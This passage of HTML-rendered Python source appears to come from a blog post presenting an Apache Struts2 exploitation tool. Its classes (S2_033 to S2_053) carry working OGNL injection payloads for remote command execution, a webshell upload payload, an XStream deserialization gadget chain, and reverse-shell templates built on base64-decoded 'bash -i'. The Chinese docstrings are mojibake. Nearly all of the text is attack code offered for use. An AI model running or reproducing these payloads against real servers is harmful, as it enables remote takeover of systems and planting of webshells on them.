url</span><br><span class="line">        else:</span><br><span class="line">            self.url = url + &#x27;/&#x27;</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;é€‰æ‹©å¯ä»¥åˆ©ç”¨æˆåŠŸçš„payload&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + self.check_poc, self.headers, self.encoding)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif html == &quot;1008660253718&quot;:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-033&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get_stream(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_037:</span><br><span class="line">    &quot;&quot;&quot;S2-037æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-037:å½±å“ç‰ˆæœ¬Struts 2.3.20-2.3.28.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    web_path = &quot;%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;pp=%2f&quot;</span><br><span class="line">    exec_payload = &quot;(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=16456&amp;command=&#123;cmd&#125;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        if url.endswith(&#x27;/&#x27;):</span><br><span class="line">            self.url = url</span><br><span class="line">        else:</span><br><span class="line">            self.url = url + &#x27;/&#x27;</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;é€‰æ‹©å¯ä»¥åˆ©ç”¨æˆåŠŸçš„payload&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-037&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + self.web_path, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get_stream(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_045:</span><br><span class="line">    &quot;&quot;&quot;S2-045æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-045:å½±å“ç‰ˆæœ¬Struts 2.3.5-2.3.31,2.5-2.5.10; POSTè¯·æ±‚å‘é€æ•°æ®,ä¸éœ€è¦å‚æ•°; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼ &quot;</span><br><span class="line">    web_path = r&quot;&quot;&quot;%&#123;(#fuck=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath(&quot;/&quot;))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;&quot;&quot;</span><br><span class="line">    exec_payload = r&quot;&quot;&quot;%&#123;(#fuck=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;CMD&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;&quot;&quot;</span><br><span class="line">    upload_payload = r&quot;&quot;&quot;%&#123;(#fuck=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#fos= new java.io.FileOutputStream(#req.getParameter(&quot;f&quot;)),#fos.write(#req.getParameter(&quot;t&quot;).getBytes()),#fos.close()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(&quot;OK&quot;),(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())))&#125;&quot;&quot;&quot;</span><br><span class="line">    shell = &quot;&#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.data = data</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-045&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        self.headers[&#x27;Content-Type&#x27;] = self.web_path</span><br><span class="line">        html = post(self.url, self.data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        self.headers[&#x27;Content-Type&#x27;] = self.exec_payload.replace(&#x27;CMD&#x27;, cmd)</span><br><span class="line">        html = post_stream(self.url, self.data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = &quot;?t=&#123;shell&#125;&amp;f=&#123;path&#125;&quot;.format(shell=quote(shell), path=upload_path)</span><br><span class="line">        self.headers[&#x27;Content-Type&#x27;] = self.upload_payload</span><br><span class="line">        html = post(self.url + data, self.data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_046:</span><br><span class="line">    &quot;&quot;&quot;S2-046æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-046:å½±å“ç‰ˆæœ¬Struts 2.3.5-2.3.31,2.5-2.5.10; POSTè¯·æ±‚å‘é€æ•°æ®,ä¸éœ€è¦å‚æ•°; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼ &quot;</span><br><span class="line">    web_path = &quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#res.getWriter().print(&#x27;&#x27;)).(#res.getWriter().print(&#x27;&#x27;)).(#res.getWriter().print(#req.getSession().getServletContext().getRealPath(&#x27;/&#x27;))).(#res.getWriter().flush()).(#res.getWriter().close())&#125;\0b&quot;</span><br><span class="line">    check_poc = &quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#res.getWriter().print(&#x27;security_&#x27;)).(#res.getWriter().print(&#x27;check&#x27;)).(#res.getWriter().flush()).(#res.getWriter().close())&#125;\0b&quot;</span><br><span class="line">    exec_payload = &quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#s=new java.util.Scanner((new java.lang.ProcessBuilder(&#x27;CMD&#x27;.toString().split(&#x27;\\\\s&#x27;))).start().getInputStream()).useDelimiter(&#x27;\\\\AAAA&#x27;)).(#str=#s.hasNext()?#s.next():&#x27;&#x27;).(#res.getWriter().print(#str)).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())&#125;\0b&quot;</span><br><span class="line">    upload_paylaod = &quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#filecontent=&#x27;SHELL&#x27;).(new java.io.BufferedWriter(new java.io.FileWriter(&#x27;PATH&#x27;)).append(new java.net.URLDecoder().decode(#filecontent,&#x27;ENCODING&#x27;)).close()).(#res.getWriter().print(&#x27;O&#x27;)).(#res.getWriter().print(&#x27;K&#x27;)).(#res.getWriter().print(#req.getContextPath())).(#res.getWriter().flush()).(#res.getWriter().close())&#125;\0b&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        files = &#123;&#x27;test&#x27;: (self.check_poc.replace(&#x27;ENCODING&#x27;, self.encoding), b&#x27;x&#x27;, &#x27;text/plain&#x27;)&#125;</span><br><span class="line">        html = post(self.url, files=files, encoding=self.encoding)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif html == &#x27;security_check&#x27;:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-046&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        files = &#123;&#x27;test&#x27;: (self.web_path.replace(&#x27;ENCODING&#x27;, self.encoding), b&#x27;x&#x27;, &#x27;text/plain&#x27;)&#125;</span><br><span class="line">        html = post(self.url, files=files, encoding=self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        paylaod = self.exec_payload.replace(&#x27;CMD&#x27;, cmd).replace(&#x27;ENCODING&#x27;, self.encoding)</span><br><span class="line">        html = post_file(self.url, paylaod, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        files = &#123;&#x27;test&#x27;: (</span><br><span class="line">            self.upload_paylaod.replace(&#x27;SHELL&#x27;, quote(shell)).replace(&#x27;PATH&#x27;, upload_path).replace(&#x27;ENCODING&#x27;,</span><br><span class="line">                                                                                                    self.encoding),</span><br><span class="line">            b&#x27;x&#x27;,</span><br><span class="line">            &#x27;text/plain&#x27;)&#125;</span><br><span class="line">        html = post(self.url, files=files, encoding=self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_048:</span><br><span class="line">    &quot;&quot;&quot;S2-048æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-048:å½±å“ç‰ˆæœ¬Struts 2.3.x with Struts 1 plugin and Struts 1 action; POSTè¯·æ±‚å‘é€æ•°æ®; é»˜è®¤å‚æ•°ä¸º:username,password; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    check_poc = &quot;%24%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span><br><span class="line">    exec_payload = &quot;%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream())).(%23q)%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;username=test&amp;password=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.format(num1=num1, num2=num2)</span><br><span class="line">        data = self.data.format(exp=poc)</span><br><span class="line">        html = post_stream(self.url, data, self.headers, self.encoding)</span><br><span class="line">        nn = str(num1 + num2)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif nn in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-048&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_052:</span><br><span class="line">    &quot;&quot;&quot;S2-052æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-052:å½±å“ç‰ˆæœ¬Struts 2.1.2-2.3.33,2.5-2.5.12; POSTè¯·æ±‚å‘é€æ•°æ®,ä¸éœ€è¦å‚æ•°; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œ(æ— å›æ˜¾)å’Œåå¼¹shell,ä¸æ”¯æŒæ£€æµ‹è¯¥æ¼æ´æ˜¯å¦å­˜åœ¨&quot;</span><br><span class="line">    exec_payload = &quot;&quot;&quot;&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command&gt;</span><br><span class="line">                        &#123;cmd&#125;</span><br><span class="line">                      &lt;/command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                    &lt;/next&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                &lt;/serviceIterator&gt;</span><br><span class="line">                &lt;lock/&gt;</span><br><span class="line">              &lt;/cipher&gt;</span><br><span class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;&quot;&quot;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/xml&#x27;</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd, type=&#x27;xml&#x27;)</span><br><span class="line">        data = self.exec_payload.format(cmd=cmd)</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_053:</span><br><span class="line">    &quot;&quot;&quot;S2-053æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-053:å½±å“ç‰ˆæœ¬Struts 2.0.1-2.3.33,2.5-2.5.10; POSTè¯·æ±‚å‘é€æ•°æ®; é»˜è®¤å‚æ•°ä¸º:username,password; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    check_poc = &quot;%25%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span><br><span class="line">    exec_payload = &quot;%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3D&#x27;&#123;cmd&#125;&#x27;).(%23iswin%3D(%40java.lang.System%40getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(%23cmds%3D(%23iswin%3F%7B&#x27;cmd.exe&#x27;%2C&#x27;%2Fc&#x27;%2C%23cmd%7D%3A%7B&#x27;%2Fbin%2Fbash&#x27;%2C&#x27;-c&#x27;%2C%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7D%0A&quot;</span><br><span class="line">    shell = &quot;&#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;username=test&amp;password=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = 